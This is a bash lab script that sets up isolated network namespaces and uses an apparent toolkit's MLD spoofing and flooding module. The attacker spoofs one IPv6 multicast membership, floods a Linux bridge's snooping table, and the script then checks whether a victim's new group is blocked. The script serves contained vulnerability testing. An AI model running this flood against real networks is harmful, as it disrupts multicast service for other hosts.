#!/usr/bin/env bash
# Isolated MLD snooping table exhaustion lab (Linux only, needs root).
#
# Topology: one bridge (the LAN, multicast snooping on, group table size MCAST_HASH_MAX) with two hosts:
#
#   victim:   a host that joins one legitimate IPv6 group before the flood and a second one after it.
#   attacker: a host that sends MLD Reports for groups it does not listen to, with MACabre's module. It
#             first spoofs one membership (SPOOF_GROUP), then floods FLOOD_GROUPS groups from FLOOD_BASE.
#
# Phases:
#   Phase 1 (control): the victim reports GROUP_BEFORE. The bridge must learn it on the victim's port.
#            If it does not, the lab cannot tell anything and exits 2.
#   Phase 2 (spoof): the attacker reports SPOOF_GROUP. The bridge must learn it on the attacker's port,
#            which shows that one port can claim a group for itself.
#   Phase 3 (flood): the attacker sends one report for each group in the range. The bridge's table fills up,
#            and the attacker's port holds almost all of its entries.
#   Phase 4 (test): the victim reports GROUP_AFTER, a legitimate group it has not joined before. With the
#            table full, the bridge must not learn it on the victim's port.
#
# Exit 0 when the control holds, the spoofed group is learned on the attacker's port, the attacker's port
# holds at least MCAST_HASH_MAX - 2 entries, and the victim's new group is not learned. Exit 1 when the
# spoof failed, the table was not full, or the new group was learned. Exit 2 when the control failed.
#
# Runs in a VM with IPv6 enabled (the sandbox has no IPv6 sysctls). The table size is set explicitly to the
# kernel default (4096). Vendor switches have their own limits, so this shows the mechanism, not the size any
# given switch uses. Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/mld_spoofing_flooding_lab.sh
#
# Requirements: iproute2 (ip, bridge), the project virtualenv (.venv) and a kernel with IPv6.
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

if [[ ! -d /proc/sys/net/ipv6 ]]; then
    echo "This lab needs IPv6 in the kernel (/proc/sys/net/ipv6 is missing). Run it in the Ubuntu VM." >&2
    exit 1
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
MCAST_HASH_MAX="${MCAST_HASH_MAX:-4096}"
FLOOD_GROUPS="${FLOOD_GROUPS:-4200}"
FLOOD_BASE="ff0e::1000"
SPOOF_GROUP="ff0e::4001"
GROUP_BEFORE="ff0e::5001"
GROUP_AFTER="ff0e::5002"
VICTIM_MAC="02:00:00:00:00:30"
ATTACKER_MAC="02:00:00:00:00:20"

stop_lab() {
    for ns in lan victim attacker; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

stop_lab

ip netns add lan
ip netns add victim
ip netns add attacker

for pair in "vic:victim" "atk:attacker"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge mcast_snooping 1 mcast_hash_max "$MCAST_HASH_MAX"
ip netns exec lan ip link set br0 up
for name in vic atk; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done
ip netns exec victim ip link set h-vic address "$VICTIM_MAC"
ip netns exec victim ip link set h-vic up
ip netns exec attacker ip link set h-atk address "$ATTACKER_MAC"
ip netns exec attacker ip link set h-atk up

# Sends one MLD report for GROUP from namespace NS, through MACabre's module. Prints the count sent.
send_one_report() {
    local ns="$1" iface="$2" mac="$3" group="$4"
    ip netns exec "$ns" env PYTHONPATH="$ROOT/src" "$PY" -c '
import sys, threading
from macabre.attacks.mld_spoofing_flooding import MldSpoofingFloodingConfig, run_mld_spoofing_flooding
stats = run_mld_spoofing_flooding(
    MldSpoofingFloodingConfig(iface=sys.argv[1], source_mac=sys.argv[2], base_group=sys.argv[3], count=1),
    threading.Event(), lambda _s: None,
)
print(stats.reports)
' "$iface" "$mac" "$group" 2>/dev/null || echo 0
}

FLOOD_CODE='
import sys, threading
from macabre.attacks.mld_spoofing_flooding import MldSpoofingFloodingConfig, run_mld_spoofing_flooding
stats = run_mld_spoofing_flooding(
    MldSpoofingFloodingConfig(iface=sys.argv[1], source_mac=sys.argv[2], base_group=sys.argv[3], count=int(sys.argv[4])),
    threading.Event(), lambda _s: None,
)
print(stats.reports)
'

# Prints the number of bridge membership entries on a port (0 when none).
entries_on_port() {
    local port="$1"
    ip netns exec lan bridge mdb show dev br0 2>/dev/null | grep -c "port $port " || true
}

# Prints "yes" when the bridge has an entry for GROUP on the port, otherwise "no".
learned() {
    local port="$1" group="$2"
    if ip netns exec lan bridge mdb show dev br0 2>/dev/null | grep "port $port " | grep -q "grp $group "; then
        echo yes
    else
        echo no
    fi
}

echo "Phase 1: control, the victim reports $GROUP_BEFORE"
send_one_report victim h-vic "$VICTIM_MAC" "$GROUP_BEFORE" >/dev/null
sleep 1
CONTROL="$(learned p-vic "$GROUP_BEFORE")"
echo "  $GROUP_BEFORE learned on the victim's port: $CONTROL"
echo

echo "Phase 2: attacker spoofs one membership, $SPOOF_GROUP"
send_one_report attacker h-atk "$ATTACKER_MAC" "$SPOOF_GROUP" >/dev/null
sleep 1
SPOOFED="$(learned p-atk "$SPOOF_GROUP")"
echo "  $SPOOF_GROUP learned on the attacker's port: $SPOOFED"
echo

echo "Phase 3: attacker sends $FLOOD_GROUPS reports, one per group from $FLOOD_BASE"
SENT="$(ip netns exec attacker env PYTHONPATH="$ROOT/src" "$PY" -c "$FLOOD_CODE" h-atk "$ATTACKER_MAC" "$FLOOD_BASE" "$FLOOD_GROUPS" 2>/dev/null || echo 0)"
echo "  reports sent: $SENT"
sleep 2
ATTACKER_ENTRIES="$(entries_on_port p-atk)"
echo "  entries on the attacker's port: $ATTACKER_ENTRIES (table size $MCAST_HASH_MAX)"
echo

echo "Phase 4: victim reports $GROUP_AFTER after the flood"
send_one_report victim h-vic "$VICTIM_MAC" "$GROUP_AFTER" >/dev/null
sleep 1
AFTER="$(learned p-vic "$GROUP_AFTER")"
echo "  $GROUP_AFTER learned on the victim's port: $AFTER"
echo

if [[ "$CONTROL" != "yes" ]]; then
    echo "Control: the bridge did not learn $GROUP_BEFORE from the victim before the attack. Result unreliable."
    exit 2
fi
if [[ "$SPOOFED" != "yes" ]]; then
    echo "Result: the bridge did not learn the spoofed group $SPOOF_GROUP on the attacker's port. Not validated."
    exit 1
fi
if (( ATTACKER_ENTRIES >= MCAST_HASH_MAX - 2 )) && [[ "$AFTER" == "no" ]]; then
    echo "Result: one port claimed $SPOOF_GROUP and filled the bridge's MLD table ($ATTACKER_ENTRIES of $MCAST_HASH_MAX entries). The victim's new group was not learned while the table was full. Vulnerable: MLD snooping can be exhausted and hijacked from one port."
    exit 0
fi
if [[ "$AFTER" == "yes" ]]; then
    echo "Result: the victim's new group was learned after the flood, so the table was not exhausted on this bridge. Not validated."
    exit 1
fi
echo "Result: the table held $ATTACKER_ENTRIES entries, below the threshold for exhaustion. Not validated."
exit 1
